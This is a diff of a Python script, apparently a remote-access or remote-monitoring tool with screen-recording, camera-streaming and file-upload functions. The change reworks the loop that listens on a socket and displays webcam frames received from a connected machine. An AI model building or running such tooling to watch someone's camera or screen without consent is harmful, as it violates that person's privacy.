@@ -160,21 +160,21 @@ def screen_record(host="0.0.0.0", port=9999):
 
 
 def konversi_byte_stream():
-     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-     sock.bind(('0.0.0.0', 9998))
-     sock.listen(1)
-     konek = sock.accept()
-     tg = konek[0]
-     ip = konek[1]
-     print(f'connected {ip}')
-     bdata = b""
-     payload_size = struct.calcsize("Q")
-     while True:
-        try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('0.0.0.0', 9998))
+    sock.listen(1)
+    konek = sock.accept()
+    tg = konek[0]
+    ip = konek[1]
+    print(f'connected {ip}')
+    bdata = b""
+    payload_size = struct.calcsize("Q")
+    try:
+        while True:
                 while(len(bdata)) < payload_size:
-                   packet = tg.recv(4*1024)
-                   if not packet: break
-                   bdata += packet
+                    packet = tg.recv(4*1024)
+                    if not packet: break
+                    bdata += packet
                 packed_msg_size = bdata[:payload_size]
                 bdata = bdata[payload_size:]
                 msg_size = struct.unpack("Q", packed_msg_size)[0]
@@ -187,15 +187,11 @@ def konversi_byte_stream():
                 cv2.imshow("streaming", frame)
                 key = cv2.waitKey(1)
                 if key & 0xFF == ord('q'):
-                   break 
-                tg.close()
-                cv2.destroyAllWindows()
-        except struct.error:
-            print("Can't access camera")
-            break
-        except OSError:
-            print("Can't access camera")
-            break
+                    break 
+        tg.close()
+        cv2.destroyAllWindows()
+    except:
+        print("Can't access camera")
 
 def upload_file(namafile):
      bufsize = 65536
